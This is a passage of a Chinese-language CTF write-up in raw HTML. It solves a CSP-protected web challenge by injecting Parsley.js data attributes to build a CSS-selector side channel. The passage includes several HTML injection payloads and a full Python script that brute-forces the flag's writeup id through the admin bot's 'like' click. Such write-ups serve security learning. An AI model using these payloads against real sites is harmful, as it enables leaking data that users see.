class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B; general.php &#x4E2D;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start([<span class="hljs-string">&apos;cookie_httponly&apos;</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-string">&apos;cookie_samesite&apos;</span> =&gt; <span class="hljs-string">&apos;Strict&apos;</span>]);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">id</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> bin2hex(random_bytes(<span class="hljs-number">8</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line">header(<span class="hljs-string">&apos;x-xss-protection: 1; mode=block&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;X-Content-Type-Options: nosniff&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;x-frame-options: DENY&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;Referrer-Policy: no-referrer&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Feature-Policy: geolocation &apos;none&apos;; midi &apos;none&apos;; sync-xhr &apos;none&apos;; microphone &apos;none&apos;; camera &apos;none&apos;; magnetometer &apos;none&apos;; gyroscope &apos;none&apos;; speaker &apos;none&apos;; fullscreen &apos;none&apos;; payment &apos;none&apos;; usb &apos;none&apos;; vr &apos;none&apos;; encrypted-media &apos;none&apos;&quot;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-&quot;</span>.$nonce.<span class="hljs-string">&quot;&apos; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &apos;self&apos;; form-action &apos;self&apos;; frame-ancestors &apos;none&apos;; require-sri-for script style;&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C;<code>script-src</code>&#x8BBE;&#x7F6E;&#x7684; nonce &#x53EA;&#x5728; header.php &#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4EEC;&#x4E5F;&#x62FF;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A; nonce</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="hljs-string">&quot;&lt;?=$nonce?&gt;&quot;</span>&gt;</span><br><span class="line">    $(<span class="hljs-string">&apos;#publish-form&apos;</span>).parsley() <span class="hljs-comment">// prevent hacking</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5F80;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;&#x90A3;&#x4E00;&#x65B9;&#x9762;&#x601D;&#x8003;&#xFF0C;&#x5E76;&#x4E14;&#x5229;&#x7528;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x7684;&#x4E24;&#x4E2A; js &#x6587;&#x4EF6;&#x5165;&#x624B;&#xFF0C;&#x4E00;&#x4E2A; jquery.js &#xFF0C;&#x53E6;&#x4E00;&#x4E2A; parsley.js&#x3002;</p><h3 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB; <a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a> &#x770B;&#x5230;&#x8BE5; lib &#x7684;&#x7B80;&#x5355;&#x8BF4;&#x660E;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;&#xFF1A;</p><blockquote><p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p><p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p><p>That&#x2019;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p></blockquote><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x8FD9;&#x662F;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x524D;&#x7AEF;&#x9A8C;&#x8BC1;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x67E5;&#x4E00;&#x4E0B;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x51E0;&#x4E2A;&#x6709;&#x610F;&#x601D;&#x7684; API&#xFF1A;</p><blockquote><p><strong>data-parsley-trigger=&#x201D;input&#x201D;</strong></p><p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&#x201D;focusin focusout&#x201D;. Default is null. See the various events supported by jQuery.</p><p><strong>data-parsley-error-message=&#x201D;my message&#x201D;</strong></p><p>Customize a unique global message for the field.</p><p><strong>data-parsley-errors-container=&#x201D;#element&#x201D;</strong></p><p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p></blockquote><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>data-parsley-trigger</code>&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x7684;&#x89E6;&#x53D1;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-error-message</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-errors-container</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7528;&#x4E00;&#x4E2A;<code>data-parsley-validate</code>&#x6307;&#x5B9A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9A8C;&#x8BC1;&#x7684;&#x8868;&#x5355;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x628A;&#x5143;&#x7D20;&#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6307;&#x5B9A;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x6765;&#x63A7;&#x5236;&#x8F93;&#x51FA;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button value=padyload&gt;&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;#div1&quot;</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>data-parsley-trigger</code>&#x6307;&#x5B9A;&#x4E86;<code>blur</code>&#x4E8B;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684; input &#x5931;&#x7126;&#x65F6;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x4E14;&#x5728; id &#x4E3A; div1 &#x7684;&#x5143;&#x7D20;&#x4E2D;&#x663E;&#x793A;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x662F;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E5F;&#x5C06;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x6E32;&#x67D3;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png" alt></p><p>###Click</p><p>&#x56DE;&#x5230;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#xFF0C;admin &#x6240;&#x505A;&#x7684;&#x52A8;&#x4F5C;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x767B;&#x5F55;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x5BF9;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x4EC0;&#x4E48;&#x5E72;&#x6270;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x70B9;&#x8D5E;&#x4E86;&#xFF0C;&#x66F4;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x901A;&#x8FC7; show.php &#x6253;&#x5F00;&#x4F60;&#x7684; writeup &#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x4E14;&#x70B9;&#x51FB;&#x9875;&#x9762;&#x4E0A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x66F4;&#x53EF;&#x80FD;&#x7684;&#x4E8B;&#x5BF9;&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x5E72;&#x6270;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7; <code>selenium.webdriver</code>&#x8C03;&#x7528;<code>find_element_by_xpath</code>&#x51FD;&#x6570;&#x5F97;&#x5230;&#x7684; id &#x4E3A; like &#x7684; input &#x5143;&#x7D20;&#x53EA;&#x80FD;&#x6709;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x5728; writeup &#x5185;&#x5BB9;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;admin &#x4E5F;&#x53EA;&#x4F1A;&#x6839;&#x636E;&#x9875;&#x9762;&#x987A;&#x5E8F;&#x62FF;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E; input &#x3002;</p><p>&#x5E76;&#x4E14; CSP &#x4E5F;&#x9650;&#x5236;&#x5F97;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x4F3C;&#x4E4E;&#x9677;&#x5165;&#x4E86;&#x50F5;&#x5C40;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4EE5;&#x4E0A; parsley.js &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x6765;&#x6784;&#x9020;&#x4E00;&#x4E9B; Payload &#x3002;</p><p>&#x9996;&#x5148;&#xFF0C;&#x56E0;&#x4E3A;<code>find_element_by_xpath</code>&#x53EA;&#x4F1A;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x901A;&#x8FC7; parsley.js &#x53EF;&#x4EE5;&#x5C06;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x8F93;&#x51FA;&#x5230;&#x6307;&#x5B9A;&#x9875;&#x9762;&#x4F4D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#xFF0C;&#x628A;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x7528;&#x7684;&#x5355;&#x72EC;&#x7684; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x539F;&#x6765;&#x7684;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x3002;</p><p>&#x4F46;&#x662F;&#x8FD9;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x4ED4;&#x7EC6;&#x770B;&#x770B; admin &#x8981;&#x70B9;&#x8D5E;&#x7684;&#x90A3;&#x4E2A;&#x9875;&#x9762;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png" alt></p><p>&#x9875;&#x9762;&#x4E0A;&#x90E8;&#x5206;&#x662F; header.php &#xFF0C;&#x4F1A;&#x5C55;&#x793A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x63D0;&#x4EA4;&#x7684; writeup &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4; admin &#x7684;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x4E5F;&#x662F;&#x552F;&#x4E00;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#x5C31;&#x662F; flag &#x7684;&#x5730;&#x5740;&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x600E;&#x4E48;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6216;&#x8005;&#x66F4;&#x786E;&#x5207;&#x7684;&#x8BF4;&#x5C31;&#x662F;&#x83B7;&#x53D6; writeup id &#x7684;&#x4E8B;&#x60C5;&#x4E86;&#x3002;</p><h3 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h3><p>&#x5982;&#x4F55;&#x83B7;&#x53D6; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x8C8C;&#x4F3C;&#x4E5F;&#x5C31;&#x8DDF;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x63D0;&#x5230;&#x7684;<code>data-parsley-errors-container</code> API &#x6709;&#x5173;&#x4E86;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A; API &#x53C8;&#x652F;&#x6301; CSS &#x9009;&#x62E9;&#x5668;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; CSS &#x9009;&#x62E9;&#x5668;&#x6765;&#x8BA9;&#x6211;&#x4EEC;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#x5462;&#xFF0C;&#x8FD9;&#x6837;&#x4EE5;&#x6765;&#x4E5F;&#x5C31;&#x76F4;&#x63A5;&#x5C31;&#x653E;&#x5230;&#x4E86;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x4E86;&#x3002;</p><p>&#x7C7B;&#x4F3C;&#x4E4B;&#x524D; XCTF Final &#x4E00;&#x4E2A; CSS &#x4FA7;&#x4FE1;&#x9053;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;<code>a[href^=&apos;/show.php?id={flag}]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5143;&#x7D20;&#x9009;&#x62E9;&#x3002;</p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E2A;&#x65E0;&#x6548;&#x7684; id=like input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x8BE5; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#xFF0C;&#x4EA6;&#x5373;&#x771F;&#x6B63;&#x7528;&#x4E8E;&#x63D0;&#x4EA4; like &#x8BF7;&#x6C42;&#x7684; input &#x6807;&#x7B7E;&#x4E4B;&#x524D;&#xFF1B;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x4E0D;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#xFF0C;parsley.js &#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x4F1A;&#x505A;&#xFF0C;admin &#x4F1A;&#x6B63;&#x5E38;&#x5730;&#x70B9;&#x8D5E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x5730;&#x5728;&#x81EA;&#x5DF1;&#x7684; writeup &#x9875;&#x9762;&#x770B;&#x5230; admin &#x7684;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x6240;&#x4EE5;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x83B7;&#x53D6; flag &#x7684; writeup id&#x3002;</p><p>&#x811A;&#x672C;&#x7F16;&#x5199;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="hljs-string">&quot;http://ip:8001/&quot;</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>) + len(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="hljs-number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="hljs-string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">flag = <span class="hljs-string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ss:</span><br><span class="line">        payload = <span class="hljs-string">f&quot;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\&quot;blur\&quot; data-parsley-error-message=&apos;&lt;input type=\&quot;input\&quot; id=like value=\&quot;rebirth_is_really_nb\&quot;&gt;&apos; data-parsley-errors-container=\&quot;a[href^=&apos;/show.php?id=<span class="hljs-subst">{flag + j}</span>&apos;]\&quot; autofocus&gt;&lt;/form&gt;&quot;</span></span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;content&apos;</span>: payload}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;add.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="hljs-string">&apos;Location&apos;</span>]</span><br><span class="line">        pos = location.find(<span class="hljs-string">&apos;id=&apos;</span>) + <span class="hljs-number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;id&apos;</span>: wp}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;admin.php&quot;</span>, data=data)</span><br><span class="line">        time.sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="hljs-string">f&quot;http://ip:8001/show.php?id=<span class="hljs-subst">{wp}</span>&quot;</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Liked by&lt;/h3&gt;admin&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x62FF;&#x5230; writeup id &#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5373;&#x53EF;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png" alt></p><h3 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h3><p>&#x5F53;&#x7136;&#x8BE5;&#x9875;&#x9762;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; a &#x6807;&#x7B7E;&#x7684; href &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x83B7;&#x53D6; writeup id&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5B83; value &#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button&gt;&quot;</span> <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;a:contains(&apos;Writeup - 5&apos;):eq(0)&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6216;&#x8005;&#x4F7F;&#x7528;<code>data-parsley-equalto</code> API &#x8FDB;&#x884C;&#x5224;&#x65AD;&#x5C5E;&#x6027;&#x503C;&#xFF1A;</p><blockquote><p><strong>data-parsley-equalto=&#x201D;#anotherfield&#x201D;</strong></p><p>Validates that the value is identical to another field&#x2019;s value (useful for password confirmation check).</p></blockquote><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;focusout&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-equalto</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;form[action=&apos;/like.php&apos;]&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&apos;&lt;input type=&quot;input&quot; name=&quot;id&quot; value=&quot;0000000000000000&quot;&gt;&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span 